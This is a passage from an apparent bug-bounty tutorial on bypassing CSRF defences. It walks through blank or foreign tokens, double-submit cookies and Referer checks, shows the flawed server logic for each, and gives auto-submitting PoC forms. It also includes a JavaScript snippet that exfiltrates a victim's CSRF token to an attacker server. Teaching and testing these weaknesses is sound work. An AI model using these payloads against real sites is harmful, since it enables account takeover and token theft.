+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;new_password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;abc123&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;submit&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;csrf-form&#34;</span>).<span style="color:#a6e22e">submit</span>();&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>This next request will send a blank csrf_token parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>The PoC will be like that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://email.example.com/password_change&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">csrf</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">form</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;new_password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;abc123&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf_token&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;submit&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;csrf-form&#34;</span>).<span style="color:#a6e22e">submit</span>();&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p><code>Deleting</code> the token parameter or sending a <code>blank</code> token often works because of a common application <code>logic mistake.</code></p>
+<p>Applications sometimes check the <code>validity</code> of the token only if the token exists, or if the token parameter is <code>not blank</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">validate_token</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">csrf_token</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">csrf_token</span>)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">pass</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">throw_error</span>(<span style="color:#e6db74">&#34;CSRF token incorrect. Request rejected.&#34;</span>)
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">process_state_changing_action</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">validate_token</span>()
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">execute_action</span>()
+</span></span></code></pre></div><p>In this case, sending a request without the token, or a blank value as the token, may mean the server won’t attempt to validate the token at all.
+You can also try submitting the request with another session’s CSRF token. This works because some applications might check only whether the token
+is valid, without confirming that it belongs to the current user.</p>
+<p>Let’s say the victim’s token is <code>871caef0757a4ac9691aceb9aad8b65b</code>, and yours is <code>YOUR_TOKEN</code>.</p>
+<p>For example, your exploit code might look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_TOKEN</span>
+</span></span></code></pre></div><p>The faulty application logic might look something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">validate_token</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">csrf_token</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">valid_csrf_tokens</span>)<span style="color:#f92672">:</span> <span style="color:#75715e">// If the token is in a list of current valid tokens
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">pass</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">throw_error</span>(<span style="color:#e6db74">&#34;CSRF token incorrect. Request rejected.&#34;</span>)
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">process_state_changing_action</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">validate_token</span>()
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">execute_action</span>() <span style="color:#75715e">//Otherwise, an error is generated and execution halts.
+</span></span></span></code></pre></div><p>If this is the case, you can insert your own <code>CSRF token into the malicious request!</code></p>
+<hr>
+<h3 id="bypass-double-submit-csrf-tokens">Bypass Double-Submit CSRF Tokens</h3>
+<p>Sites also commonly use a double-submit cookie as a defense against CSRF.</p>
+<p>For example, this request would be deemed valid, because the csrf_token in the user’s cookies matches the csrf_token in the POST request parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>; <span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#ae81ff">871</span><span style="color:#a6e22e">caef0757a4ac9691aceb9aad8b65b</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#ae81ff">871</span><span style="color:#a6e22e">caef0757a4ac9691aceb9aad8b65b</span>
+</span></span></code></pre></div><p>In a double-submit token validation system, it does not matter whether the tokens themselves are valid. The server checks only whether the token in the cookies is the same as the token in the request parameters:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>; <span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">aceb9aad8b65b871caef0757a4ac969</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#ae81ff">871</span><span style="color:#a6e22e">caef0757a4ac9691aceb9aad8b65b</span>
+</span></span></code></pre></div><p>So it will fail.</p>
+<p>If the application uses <code>double-submit</code> cookies as its <code>CSRF defense mechanism</code>, it’s probably not keeping records of the <code>valid token server-side</code>. If the
+server were keeping records of the CSRF token server-side, it could simply validate the token when it was sent over, and the application would not need
+to use double-submit cookies in the first place.</p>
+<p>The server has no way of knowing if any token it receives is actually legitimate; it’s merely checking that the token in the <code>cookie</code> and the token
+in the <code>request body</code> is the same.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>; <span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#a6e22e">not_a_real_token</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#a6e22e">not_a_real_token</span>
+</span></span></code></pre></div><p>The attack would then consist of two steps: <code>first</code>, you’d use a <code>sessionfixation</code> technique to make the victim’s browser store whatever value you
+<code>choose</code> as the CSRF token cookie. Session fixation is an attack that allows attackers to <code>select</code> the session cookies of the victim.  you can read about them on Wikipedia (<a href="https://en.wikipedia.org/wiki/Session_fixation">https://en.wikipedia.org/wiki/Session_fixation</a>). Then, you’d execute the CSRF with the same <code>CSRF token that you chose</code> as the cookie.</p>
+<hr>
+<h3 id="bypass-csrf-referer-header-check">Bypass CSRF Referer Header Check</h3>
+<blockquote>
+<p><strong>What if your target site isn’t using CSRF tokens but checking the referer header instead?</strong></p>
+</blockquote>
+<p>The server might check for the <code>referer header</code> sent with the <code>state-changing request</code> if it’s allowed with <code>allowedlisted domain</code>.</p>
+<p><strong>What can you do to bypass this type of protection?</strong></p>
+<p>First you can remove the referer header</p>
+<p>To remove the referer header, add a <code>&lt;meta&gt;</code> tag to the page hosting your request form:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;referrer&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-referrer&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://email.example.com/password_change&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf-form&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;new_password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;abc123&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;submit&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;csrf-form&#34;</span>).<span style="color:#a6e22e">submit</span>();&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>The faulty application logic might look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">validate_referer</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">referer</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">allowlisted_domains</span>)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pass</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">throw_error</span>(<span style="color:#e6db74">&#34;Referer incorrect. Request rejected.&#34;</span>)
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">process_state_changing_action</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">referer</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">validate_referer</span>()
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">execute_action</span>()
+</span></span></code></pre></div><p>Since the application validates the referer header only if it exists, you’ve successfully bypassed the website’s CSRF protection just by making the victim’s browser delete the referer header!</p>
+<p>You can also try to bypass the <code>logic check</code> used to validate the referer URL.</p>
+<p>Let’s say the application looks for the string &ldquo;<a href="http://example.com/"><code>example.com</code></a>&rdquo; in the referer URL, and if the <code>referer URL contains that string</code>, the application treats the request as <code>legitimate</code>. Otherwise, it <code>rejects</code> the request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">validate_referer</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">referer</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;example.com&#34;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">referer</span>)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">pass</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">throw_error</span>(<span style="color:#e6db74">&#34;Referer incorrect. Request rejected.&#34;</span>)
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">process_state_changing_action</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">validate_referer</span>()
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">execute_action</span>()
+</span></span></code></pre></div><p>In this case, you can bypass the referer check by placing the victim domain name in the referer URL as a subdomain. You can achieve this by
+creating a subdomain named after the victim’s domain, and then hosting the malicious HTML on that subdomain. Your request would look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>.<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span>
+</span></span></code></pre></div><p>You can also try placing the victim domain name in the referer URL as a pathname.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span>
+</span></span></code></pre></div><hr>
+<h3 id="bypass-csrf-protection-by-using-xss">Bypass CSRF Protection by Using XSS</h3>
+<p>XSS vulnerability will defeat CSRF protections, because XSS will allow attackers to steal the legitimate
+CSRF token and then craft forged requests by using XMLHttpRequest. Often,
+attackers will find XSS as the starting point to launch CSRFs to take over admin accounts.</p>
+<p>For example,
+this code snippet reads the CSRF token embedded on the victim’s page and sends it to the attacker’s server as a URL parameter named token. If you can
+steal a user’s CSRF tokens, you can execute actions on their behalf by using those tokens to bypass CSRF protection on the site.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementsById</span>(<span style="color:#e6db74">&#39;csrf-token&#39;</span>)[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://attacker_server_ip/?token=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">token</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">null</span>);
+</span></span></code></pre></div><hr>
+<h1 id="escalating-the-attack"><code>Escalating the Attack</code></h1>
+<blockquote>
+<p>After you’ve found a CSRF vulnerability, don’t just report it right away! Here are a few ways you can escalate CSRFs into severe security issues to maximize the impact of your report</p>
+</blockquote>
+<h3 id="leak-user-information-by-using-csrf">Leak User Information by Using CSRF</h3>
+<p>For example, let’s say the <a href="http://example.com/">example.com</a> web application sends monthly billing emails to a user-designated email address.</p>
+<p>The request will be like that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">change_billing_email</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>;
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">email</span><span style="color:#f92672">=</span><span style="color:#a6e22e">NEW_EMAIL</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#ae81ff">871</span><span style="color:#a6e22e">caef0757a4ac9691aceb9aad8b65b</span>
+</span></span></code></pre></div><p>As we can see the CSRF validation on this endpoint is broken, <code>THE REQUEST WILL SECCEED EVEN IF ITS REMOVED.</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">change_billing_email</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>;
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">email</span><span style="color:#f92672">=</span><span style="color:#a6e22e">NEW_EMAIL</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>The Attacker Could make the victim to send this request via CSRF with his E-mail instead:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">change_billing_email</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>;
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
